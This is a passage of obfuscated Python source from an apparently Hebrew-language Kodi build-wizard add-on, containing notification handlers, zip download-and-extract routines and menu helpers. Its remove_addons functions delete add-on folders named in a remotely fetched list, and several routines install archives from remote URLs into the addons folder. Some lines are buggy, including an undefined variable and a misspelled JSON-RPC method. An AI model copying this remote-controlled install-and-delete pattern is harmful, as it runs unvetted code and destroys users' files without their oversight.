	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5140
	if ENABLE =='Yes':#line:5141
		if not NOTIFY =='true':#line:5142
			O00O00O000000OO00 =wiz .workingURL (NOTIFICATION )#line:5143
			if O00O00O000000OO00 ==True :#line:5144
				OOOO00O0OOO0O0000 ,O0000O0OOO0OOOO00 =wiz .splitNotify (NOTIFICATION )#line:5145
				if not OOOO00O0OOO0O0000 ==False :#line:5147
					try :#line:5148
						OOOO00O0OOO0O0000 =int (OOOO00O0OOO0O0000 );OO0OOOOOOO0O0O00O =int (OO0OOOOOOO0O0O00O )#line:5149
						checkidupdate ()#line:5150
						wiz .setS ("notedismiss","true")#line:5151
						if OOOO00O0OOO0O0000 ==OO0OOOOOOO0O0O00O :#line:5152
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOO00O0OOO0O0000 ),xbmc .LOGNOTICE )#line:5153
						elif OOOO00O0OOO0O0000 >OO0OOOOOOO0O0O00O :#line:5155
							wiz .log ("[Notifications] id: %s"%str (OOOO00O0OOO0O0000 ),xbmc .LOGNOTICE )#line:5156
							wiz .setS ('noteid',str (OOOO00O0OOO0O0000 ))#line:5157
							wiz .setS ("notedismiss","true")#line:5158
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5161
					except Exception as OO000OOOO0O0OOO00 :#line:5162
						wiz .log ("Error on Notifications Window: %s"%str (OO000OOOO0O0OOO00 ),xbmc .LOGERROR )#line:5163
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5165
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00O00O000000OO00 ),xbmc .LOGNOTICE )#line:5166
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5167
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5168
def checkidupdate ():#line:5174
				wiz .setS ("notedismiss","true")#line:5176
				OOOO000OOOO00OO00 =wiz .workingURL (NOTIFICATION )#line:5177
				OO0000OOOOOOO0OOO =" Kodi Premium"#line:5179
				O0000O000O0O00O00 =wiz .checkBuild (OO0000OOOOOOO0OOO ,'gui')#line:5180
				OOO0O00O00O0OO000 =OO0000OOOOOOO0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5181
				if not wiz .workingURL (O0000O000O0O00O00 )==True :return #line:5182
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5183
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0000OOOOOOO0OOO ),'','אנא המתן')#line:5184
				OOOOOOOO0OOO0O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O00O00O0OO000 )#line:5185
				try :os .remove (OOOOOOOO0OOO0O0OO )#line:5186
				except :pass #line:5187
				logging .warning (O0000O000O0O00O00 )#line:5188
				if 'google'in O0000O000O0O00O00 :#line:5189
				   O0O0OO000000O0O0O =googledrive_download (O0000O000O0O00O00 ,OOOOOOOO0OOO0O0OO ,DP ,wiz .checkBuild (OO0000OOOOOOO0OOO ,'filesize'))#line:5190
				else :#line:5193
				  downloader .download (O0000O000O0O00O00 ,OOOOOOOO0OOO0O0OO ,DP )#line:5194
				xbmc .sleep (100 )#line:5195
				O00O0O00O0O0OO0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000OOOOOOO0OOO )#line:5196
				DP .update (0 ,O00O0O00O0O0OO0O0 ,'','אנא המתן')#line:5197
				extract .all (OOOOOOOO0OOO0O0OO ,HOME ,DP ,title =O00O0O00O0O0OO0O0 )#line:5198
				DP .close ()#line:5199
				wiz .defaultSkin ()#line:5200
				wiz .lookandFeelData ('save')#line:5201
				if KODIV >=18 :#line:5202
					skindialogsettind18 ()#line:5203
				if INSTALLMETHOD ==1 :O00OO0000O00OOO00 =1 #line:5206
				elif INSTALLMETHOD ==2 :O00OO0000O00OOO00 =0 #line:5207
				else :DP .close ()#line:5208
def gaiaserenaddon ():#line:5210
  O0O00O00OO0O0000O =(ADDON .getSetting ("gaiaseren"))#line:5211
  OOO000OOO0O0OOO00 =(ADDON .getSetting ("auto_rd"))#line:5212
  if O0O00O00OO0O0000O =='true'and OOO000OOO0O0OOO00 =='true':#line:5213
    OOO00O0O00OOO00OO =(NEWFASTUPDATE )#line:5214
    OO0OO0OOOOO00OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5215
    OOOO0000000000OOO =xbmcgui .DialogProgress ()#line:5216
    OOOO0000000000OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5217
    OOO0OO0OOO0O0O00O =os .path .join (PACKAGES ,'isr.zip')#line:5218
    OO0O00000000O0O00 =urllib2 .Request (OOO00O0O00OOO00OO )#line:5219
    O0000000O0O00OOO0 =urllib2 .urlopen (OO0O00000000O0O00 )#line:5220
    OOOOOOO0O000O0OOO =xbmcgui .DialogProgress ()#line:5222
    OOOOOOO0O000O0OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5223
    OOOOOOO0O000O0OOO .update (0 )#line:5224
    OO0O0OO0OOO0OO00O =open (OOO0OO0OOO0O0O00O ,'wb')#line:5226
    try :#line:5228
      O00O0O00OO0O00OOO =O0000000O0O00OOO0 .info ().getheader ('Content-Length').strip ()#line:5229
      O0O00OO0O0O0O00OO =True #line:5230
    except AttributeError :#line:5231
          O0O00OO0O0O0O00OO =False #line:5232
    if O0O00OO0O0O0O00OO :#line:5234
          O00O0O00OO0O00OOO =int (O00O0O00OO0O00OOO )#line:5235
    O0OOO0000OOOOOOO0 =0 #line:5237
    OO0OOOO00O0OOO0OO =time .time ()#line:5238
    while True :#line:5239
          OOO0O0OOO00OOOO00 =O0000000O0O00OOO0 .read (8192 )#line:5240
          if not OOO0O0OOO00OOOO00 :#line:5241
              sys .stdout .write ('\n')#line:5242
              break #line:5243
          O0OOO0000OOOOOOO0 +=len (OOO0O0OOO00OOOO00 )#line:5245
          OO0O0OO0OOO0OO00O .write (OOO0O0OOO00OOOO00 )#line:5246
          if not O0O00OO0O0O0O00OO :#line:5248
              O00O0O00OO0O00OOO =O0OOO0000OOOOOOO0 #line:5249
          if OOOOOOO0O000O0OOO .iscanceled ():#line:5250
             OOOOOOO0O000O0OOO .close ()#line:5251
             try :#line:5252
              os .remove (OOO0OO0OOO0O0O00O )#line:5253
             except :#line:5254
              pass #line:5255
             break #line:5256
          O0O00O0O00O000OOO =float (O0OOO0000OOOOOOO0 )/O00O0O00OO0O00OOO #line:5257
          O0O00O0O00O000OOO =round (O0O00O0O00O000OOO *100 ,2 )#line:5258
          O000O0O00OOOO000O =O0OOO0000OOOOOOO0 /(1024 *1024 )#line:5259
          O0OOOOO0OOOO00OO0 =O00O0O00OO0O00OOO /(1024 *1024 )#line:5260
          O0O000O0O0O000O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000O0O00OOOO000O ,'teal',O0OOOOO0OOOO00OO0 )#line:5261
          if (time .time ()-OO0OOOO00O0OOO0OO )>0 :#line:5262
            O00000O000OOOO00O =O0OOO0000OOOOOOO0 /(time .time ()-OO0OOOO00O0OOO0OO )#line:5263
            O00000O000OOOO00O =O00000O000OOOO00O /1024 #line:5264
          else :#line:5265
           O00000O000OOOO00O =0 #line:5266
          OOOO0O0OOO0O00000 ='KB'#line:5267
          if O00000O000OOOO00O >=1024 :#line:5268
             O00000O000OOOO00O =O00000O000OOOO00O /1024 #line:5269
             OOOO0O0OOO0O00000 ='MB'#line:5270
          if O00000O000OOOO00O >0 and not O0O00O0O00O000OOO ==100 :#line:5271
              O0O000000O0O0OO00 =(O00O0O00OO0O00OOO -O0OOO0000OOOOOOO0 )/O00000O000OOOO00O #line:5272
          else :#line:5273
              O0O000000O0O0OO00 =0 #line:5274
          O0000O0000O0OO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00000O000OOOO00O ,OOOO0O0OOO0O00000 )#line:5275
          OOOOOOO0O000O0OOO .update (int (O0O00O0O00O000OOO ),O0O000O0O0O000O00 ,O0000O0000O0OO00O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5277
    OOO0OO0OO0O0OOO00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5280
    OO0O0OO0OOO0OO00O .close ()#line:5283
    extract .all (OOO0OO0OOO0O0O00O ,OOO0OO0OO0O0OOO00 ,OOOOOOO0O000O0OOO )#line:5284
    try :#line:5288
      os .remove (OOO0OO0OOO0O0O00O )#line:5289
    except :#line:5290
      pass #line:5291
def iptvsimpldownpc ():#line:5292
    OO00O0OOO0O0000O0 =(IPTVSIMPL18PC )#line:5294
    OO00OO00O00O0OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5295
    OOOOO000OO0O0O0O0 =xbmcgui .DialogProgress ()#line:5296
    OOOOO000OO0O0O0O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5297
    OO0O0000OO000O0O0 =os .path .join (PACKAGES ,'isr.zip')#line:5298
    OO000OOOOO00O00O0 =urllib2 .Request (OO00O0OOO0O0000O0 )#line:5299
    OO0OOOO0OOOO00OOO =urllib2 .urlopen (OO000OOOOO00O00O0 )#line:5300
    O000000O00OO0OOOO =xbmcgui .DialogProgress ()#line:5302
    O000000O00OO0OOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5303
    O000000O00OO0OOOO .update (0 )#line:5304
    OO000O0O00000000O =open (OO0O0000OO000O0O0 ,'wb')#line:5306
    try :#line:5308
      OO00OO00000O00O00 =OO0OOOO0OOOO00OOO .info ().getheader ('Content-Length').strip ()#line:5309
      OO0000OOO0OOO0O0O =True #line:5310
    except AttributeError :#line:5311
          OO0000OOO0OOO0O0O =False #line:5312
    if OO0000OOO0OOO0O0O :#line:5314
          OO00OO00000O00O00 =int (OO00OO00000O00O00 )#line:5315
    OO00OOOOOO00O00OO =0 #line:5317
    O00O000O00OO00O0O =time .time ()#line:5318
    while True :#line:5319
          OOOO00O00O0000O00 =OO0OOOO0OOOO00OOO .read (8192 )#line:5320
          if not OOOO00O00O0000O00 :#line:5321
              sys .stdout .write ('\n')#line:5322
              break #line:5323
          OO00OOOOOO00O00OO +=len (OOOO00O00O0000O00 )#line:5325
          OO000O0O00000000O .write (OOOO00O00O0000O00 )#line:5326
          if not OO0000OOO0OOO0O0O :#line:5328
              OO00OO00000O00O00 =OO00OOOOOO00O00OO #line:5329
          if O000000O00OO0OOOO .iscanceled ():#line:5330
             O000000O00OO0OOOO .close ()#line:5331
             try :#line:5332
              os .remove (OO0O0000OO000O0O0 )#line:5333
             except :#line:5334
              pass #line:5335
             break #line:5336
          OOO00O0000O0OO00O =float (OO00OOOOOO00O00OO )/OO00OO00000O00O00 #line:5337
          OOO00O0000O0OO00O =round (OOO00O0000O0OO00O *100 ,2 )#line:5338
          O000O00OOOOOO0O00 =OO00OOOOOO00O00OO /(1024 *1024 )#line:5339
          OO000O0OO0000O000 =OO00OO00000O00O00 /(1024 *1024 )#line:5340
          O0O0O0OO0O00O000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000O00OOOOOO0O00 ,'teal',OO000O0OO0000O000 )#line:5341
          if (time .time ()-O00O000O00OO00O0O )>0 :#line:5342
            O0OOO00OOOOO0O00O =OO00OOOOOO00O00OO /(time .time ()-O00O000O00OO00O0O )#line:5343
            O0OOO00OOOOO0O00O =O0OOO00OOOOO0O00O /1024 #line:5344
          else :#line:5345
           O0OOO00OOOOO0O00O =0 #line:5346
          O0000O00O0O00OO0O ='KB'#line:5347
          if O0OOO00OOOOO0O00O >=1024 :#line:5348
             O0OOO00OOOOO0O00O =O0OOO00OOOOO0O00O /1024 #line:5349
             O0000O00O0O00OO0O ='MB'#line:5350
          if O0OOO00OOOOO0O00O >0 and not OOO00O0000O0OO00O ==100 :#line:5351
              O0OOOO0000OO0O0O0 =(OO00OO00000O00O00 -OO00OOOOOO00O00OO )/O0OOO00OOOOO0O00O #line:5352
          else :#line:5353
              O0OOOO0000OO0O0O0 =0 #line:5354
          OO00000OO000OOOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO00OOOOO0O00O ,O0000O00O0O00OO0O )#line:5355
          O000000O00OO0OOOO .update (int (OOO00O0000O0OO00O ),O0O0O0OO0O00O000O ,OO00000OO000OOOOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5357
    O0000OOOO0OO0O0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5360
    OO000O0O00000000O .close ()#line:5363
    extract .all (OO0O0000OO000O0O0 ,O0000OOOO0OO0O0OO ,O000000O00OO0OOOO )#line:5364
    try :#line:5368
      os .remove (OO0O0000OO000O0O0 )#line:5369
    except :#line:5370
      pass #line:5371
def iptvsimpldown ():#line:5372
    O00O00000O0OO0OO0 =(IPTV18 )#line:5374
    O0OO00OO00O00OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5375
    OO00OO0O0O0O0OOOO =xbmcgui .DialogProgress ()#line:5376
    OO00OO0O0O0O0OOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5377
    OOO0OOOO000O0O0O0 =os .path .join (PACKAGES ,'isr.zip')#line:5378
    OO00000OOO0000OOO =urllib2 .Request (O00O00000O0OO0OO0 )#line:5379
    OOO00O000000OO00O =urllib2 .urlopen (OO00000OOO0000OOO )#line:5380
    O0O0000O0000OO000 =xbmcgui .DialogProgress ()#line:5382
    O0O0000O0000OO000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5383
    O0O0000O0000OO000 .update (0 )#line:5384
    O0O0OO0OO00OOOO00 =open (OOO0OOOO000O0O0O0 ,'wb')#line:5386
    try :#line:5388
      O0O0O00OOO0OOO000 =OOO00O000000OO00O .info ().getheader ('Content-Length').strip ()#line:5389
      O0OO000000O0000OO =True #line:5390
    except AttributeError :#line:5391
          O0OO000000O0000OO =False #line:5392
    if O0OO000000O0000OO :#line:5394
          O0O0O00OOO0OOO000 =int (O0O0O00OOO0OOO000 )#line:5395
    OO00OO00O0O0OOOO0 =0 #line:5397
    O0O00OOO0O0O00OO0 =time .time ()#line:5398
    while True :#line:5399
          OOOOOOOO0O00O0OO0 =OOO00O000000OO00O .read (8192 )#line:5400
          if not OOOOOOOO0O00O0OO0 :#line:5401
              sys .stdout .write ('\n')#line:5402
              break #line:5403
          OO00OO00O0O0OOOO0 +=len (OOOOOOOO0O00O0OO0 )#line:5405
          O0O0OO0OO00OOOO00 .write (OOOOOOOO0O00O0OO0 )#line:5406
          if not O0OO000000O0000OO :#line:5408
              O0O0O00OOO0OOO000 =OO00OO00O0O0OOOO0 #line:5409
          if O0O0000O0000OO000 .iscanceled ():#line:5410
             O0O0000O0000OO000 .close ()#line:5411
             try :#line:5412
              os .remove (OOO0OOOO000O0O0O0 )#line:5413
             except :#line:5414
              pass #line:5415
             break #line:5416
          OOO0O00000OO0O0OO =float (OO00OO00O0O0OOOO0 )/O0O0O00OOO0OOO000 #line:5417
          OOO0O00000OO0O0OO =round (OOO0O00000OO0O0OO *100 ,2 )#line:5418
          O0O00OO000O000000 =OO00OO00O0O0OOOO0 /(1024 *1024 )#line:5419
          OO000OO000O0OOOO0 =O0O0O00OOO0OOO000 /(1024 *1024 )#line:5420
          O0OO0OO0OOOO00O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O00OO000O000000 ,'teal',OO000OO000O0OOOO0 )#line:5421
          if (time .time ()-O0O00OOO0O0O00OO0 )>0 :#line:5422
            O0OOO00O0O00OOOOO =OO00OO00O0O0OOOO0 /(time .time ()-O0O00OOO0O0O00OO0 )#line:5423
            O0OOO00O0O00OOOOO =O0OOO00O0O00OOOOO /1024 #line:5424
          else :#line:5425
           O0OOO00O0O00OOOOO =0 #line:5426
          O00O0OOO000O00O0O ='KB'#line:5427
          if O0OOO00O0O00OOOOO >=1024 :#line:5428
             O0OOO00O0O00OOOOO =O0OOO00O0O00OOOOO /1024 #line:5429
             O00O0OOO000O00O0O ='MB'#line:5430
          if O0OOO00O0O00OOOOO >0 and not OOO0O00000OO0O0OO ==100 :#line:5431
              OO00OOOOOOOOOOOO0 =(O0O0O00OOO0OOO000 -OO00OO00O0O0OOOO0 )/O0OOO00O0O00OOOOO #line:5432
          else :#line:5433
              OO00OOOOOOOOOOOO0 =0 #line:5434
          O00OO0O0O00O0OO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO00O0O00OOOOO ,O00O0OOO000O00O0O )#line:5435
          O0O0000O0000OO000 .update (int (OOO0O00000OO0O0OO ),O0OO0OO0OOOO00O0O ,O00OO0O0O00O0OO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5437
    OOOOOOO0OOO00O00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5440
    O0O0OO0OO00OOOO00 .close ()#line:5443
    extract .all (OOO0OOOO000O0O0O0 ,OOOOOOO0OOO00O00O ,O0O0000O0000OO000 )#line:5444
    try :#line:5448
      os .remove (OOO0OOOO000O0O0O0 )#line:5449
    except :#line:5450
      pass #line:5451
def testnotify ():#line:5452
	O0O0O0OO00000O0O0 =wiz .workingURL (NOTIFICATION )#line:5453
	if O0O0O0OO00000O0O0 ==True :#line:5454
		try :#line:5455
			O00OO0O0O0OO0OOO0 ,O0O0000OO0O0OOOOO =wiz .splitNotify (NOTIFICATION )#line:5456
			if O00OO0O0O0OO0OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5457
			if STARTP2 ()=='ok':#line:5458
				notify .notification (O0O0000OO0O0OOOOO ,True )#line:5459
		except Exception as OO00000OOOO0OO0OO :#line:5460
			wiz .log ("Error on Notifications Window: %s"%str (OO00000OOOO0OO0OO ),xbmc .LOGERROR )#line:5461
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5462
def testnotify2 ():#line:5463
	O000000O0O0O0OOO0 =wiz .workingURL (NOTIFICATION2 )#line:5464
	if O000000O0O0O0OOO0 ==True :#line:5465
		try :#line:5466
			OOO0O0OOO0OOO00O0 ,OOOOOO00OO000O0O0 =wiz .splitNotify (NOTIFICATION2 )#line:5467
			if OOO0O0OOO0OOO00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5468
			if STARTP2 ()=='ok':#line:5469
				notify .notification2 (OOOOOO00OO000O0O0 ,True )#line:5470
		except Exception as O00OOOO00OO00000O :#line:5471
			wiz .log ("Error on Notifications Window: %s"%str (O00OOOO00OO00000O ),xbmc .LOGERROR )#line:5472
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5473
def testnotify3 ():#line:5474
	O0O000000O0O00O0O =wiz .workingURL (NOTIFICATION3 )#line:5475
	if O0O000000O0O00O0O ==True :#line:5476
		try :#line:5477
			OOO0O00000O00O000 ,O00O000O0O00OO0O0 =wiz .splitNotify (NOTIFICATION3 )#line:5478
			if OOO0O00000O00O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5479
			if STARTP2 ()=='ok':#line:5480
				notify .notification3 (O00O000O0O00OO0O0 ,True )#line:5481
		except Exception as OO000O0OO0000OO0O :#line:5482
			wiz .log ("Error on Notifications Window: %s"%str (OO000O0OO0000OO0O ),xbmc .LOGERROR )#line:5483
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5484
def servicemanual ():#line:5485
	O0O0OOO0OO0O000OO =wiz .workingURL (HELPINFO )#line:5486
	if O0O0OOO0OO0O000OO ==True :#line:5487
		try :#line:5488
			OOO00000OOOO0O00O ,OOO0O0000OO000O00 =wiz .splitNotify (HELPINFO )#line:5489
			if OOO00000OOOO0O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5490
			notify .helpinfo (OOO0O0000OO000O00 ,True )#line:5491
		except Exception as OOOO0000O000OO0OO :#line:5492
			wiz .log ("Error on Notifications Window: %s"%str (OOOO0000O000OO0OO ),xbmc .LOGERROR )#line:5493
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5494
def testupdate ():#line:5496
	if BUILDNAME =="":#line:5497
		notify .updateWindow ()#line:5498
	else :#line:5499
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5500
def testfirst ():#line:5502
	notify .firstRun ()#line:5503
def testfirstRun ():#line:5505
	notify .firstRunSettings ()#line:5506
def fastinstall ():#line:5509
	notify .firstRuninstall ()#line:5510
def addDir (O0O0O0OO0O0O0O0O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5517
	O00OO0OOOO000OO0O =sys .argv [0 ]#line:5518
	if not mode ==None :O00OO0OOOO000OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5519
	if not name ==None :O00OO0OOOO000OO0O +="&name="+urllib .quote_plus (name )#line:5520
	if not url ==None :O00OO0OOOO000OO0O +="&url="+urllib .quote_plus (url )#line:5521
	O0O000O00O0OO0OO0 =True #line:5522
	if themeit :O0O0O0OO0O0O0O0O0 =themeit %O0O0O0OO0O0O0O0O0 #line:5523
	OO00OO0OO0O00OO0O =xbmcgui .ListItem (O0O0O0OO0O0O0O0O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5524
	OO00OO0OO0O00OO0O .setInfo (type ="Video",infoLabels ={"Title":O0O0O0OO0O0O0O0O0 ,"Plot":description })#line:5525
	OO00OO0OO0O00OO0O .setProperty ("Fanart_Image",fanart )#line:5526
	if not menu ==None :OO00OO0OO0O00OO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5527
	O0O000O00O0OO0OO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OO0OOOO000OO0O ,listitem =OO00OO0OO0O00OO0O ,isFolder =True )#line:5528
	return O0O000O00O0OO0OO0 #line:5529
def addFile (OOOOO00OO000OOO0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5531
	O0O0O00OO00OO0O0O =sys .argv [0 ]#line:5532
	if not mode ==None :O0O0O00OO00OO0O0O +="?mode=%s"%urllib .quote_plus (mode )#line:5533
	if not name ==None :O0O0O00OO00OO0O0O +="&name="+urllib .quote_plus (name )#line:5534
	if not url ==None :O0O0O00OO00OO0O0O +="&url="+urllib .quote_plus (url )#line:5535
	O0OOOOO000O0O0OOO =True #line:5536
	if themeit :OOOOO00OO000OOO0O =themeit %OOOOO00OO000OOO0O #line:5537
	O00OOO0OO0O0O0000 =xbmcgui .ListItem (OOOOO00OO000OOO0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5538
	O00OOO0OO0O0O0000 .setInfo (type ="Video",infoLabels ={"Title":OOOOO00OO000OOO0O ,"Plot":description })#line:5539
	O00OOO0OO0O0O0000 .setProperty ("Fanart_Image",fanart )#line:5540
	if not menu ==None :O00OOO0OO0O0O0000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5541
	O0OOOOO000O0O0OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0O00OO00OO0O0O ,listitem =O00OOO0OO0O0O0000 ,isFolder =False )#line:5542
	return O0OOOOO000O0O0OOO #line:5543
def get_params ():#line:5545
	O0O0OO0OOO0O00000 =[]#line:5546
	OOOOOO00O00O00O00 =sys .argv [2 ]#line:5547
	if len (OOOOOO00O00O00O00 )>=2 :#line:5548
		OO00OOO00OOO0OO00 =sys .argv [2 ]#line:5549
		OO00O0OO0OOOOOOOO =OO00OOO00OOO0OO00 .replace ('?','')#line:5550
		if (OO00OOO00OOO0OO00 [len (OO00OOO00OOO0OO00 )-1 ]=='/'):#line:5551
			OO00OOO00OOO0OO00 =OO00OOO00OOO0OO00 [0 :len (OO00OOO00OOO0OO00 )-2 ]#line:5552
		O000000OOO000OO00 =OO00O0OO0OOOOOOOO .split ('&')#line:5553
		O0O0OO0OOO0O00000 ={}#line:5554
		for O0000OO000O0O0OOO in range (len (O000000OOO000OO00 )):#line:5555
			OOOO0OOO00O0O0O0O ={}#line:5556
			OOOO0OOO00O0O0O0O =O000000OOO000OO00 [O0000OO000O0O0OOO ].split ('=')#line:5557
			if (len (OOOO0OOO00O0O0O0O ))==2 :#line:5558
				O0O0OO0OOO0O00000 [OOOO0OOO00O0O0O0O [0 ]]=OOOO0OOO00O0O0O0O [1 ]#line:5559
		return O0O0OO0OOO0O00000 #line:5561
def remove_addons ():#line:5563
	try :#line:5564
			import json #line:5565
			OOOOOOO0O0O00OO00 =urllib2 .urlopen (remove_url ).readlines ()#line:5566
			for O00O00OO0O00O0OO0 in OOOOOOO0O0O00OO00 :#line:5567
				OOO000OOOOO00OO00 =O00O00OO0O00O0OO0 .split (':')[1 ].strip ()#line:5569
				OOOO000O0OO0000O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOO000OOOOO00OO00 ,'false')#line:5570
				O0O000000OOOO0000 =xbmc .executeJSONRPC (OOOO000O0OO0000O0 )#line:5571
				OO0O0O00OOOOOO00O =json .loads (O0O000000OOOO0000 )#line:5572
				O0OO00O0O00OO0000 =os .path .join (addons_folder ,OOO000OOOOO00OO00 )#line:5574
				if os .path .exists (O0OO00O0O00OO0000 ):#line:5576
					for O0O00O000OO0O0O0O ,O00OOO0OOOO000OO0 ,OOOOOOOO0000OO00O in os .walk (O0OO00O0O00OO0000 ):#line:5577
						for OO0000O0O0O00OOOO in OOOOOOOO0000OO00O :#line:5578
							os .unlink (os .path .join (O0O00O000OO0O0O0O ,OO0000O0O0O00OOOO ))#line:5579
						for OOO00O00OO000O0OO in O00OOO0OOOO000OO0 :#line:5580
							shutil .rmtree (os .path .join (O0O00O000OO0O0O0O ,OOO00O00OO000O0OO ))#line:5581
					os .rmdir (O0OO00O0O00OO0000 )#line:5582
			xbmc .executebuiltin ('Container.Refresh')#line:5584
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5585
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5586
	except :pass #line:5587
def remove_addons2 ():#line:5588
	try :#line:5589
			import json #line:5590
			OO000OOO0OOOO0O00 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5591
			for O0O00O00O0OO00O00 in OO000OOO0OOOO0O00 :#line:5592
				OOO0OO00O0OOO0O00 =O0O00O00O0OO00O00 .split (':')[1 ].strip ()#line:5594
				O00OO0000O00000OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOO0OO00O0OOO0O00 ,'false')#line:5595
				O0OO0OOOO0O0O000O =xbmc .executeJSONRPC (O00OO0000O00000OO )#line:5596
				O00OOOO0000000OO0 =json .loads (O0OO0OOOO0O0O000O )#line:5597
				O00OO0OO00OO00O0O =os .path .join (user_folder ,OOO0OO00O0OOO0O00 )#line:5599
				if os .path .exists (O00OO0OO00OO00O0O ):#line:5601
					for OO0OO0O00000O00O0 ,O000O0O0O0OO00OOO ,OO0OOOOO0OOO0OO0O in os .walk (O00OO0OO00OO00O0O ):#line:5602
						for OO0OOO0O0OOO00O00 in OO0OOOOO0OOO0OO0O :#line:5603
							os .unlink (os .path .join (OO0OO0O00000O00O0 ,OO0OOO0O0OOO00O00 ))#line:5604
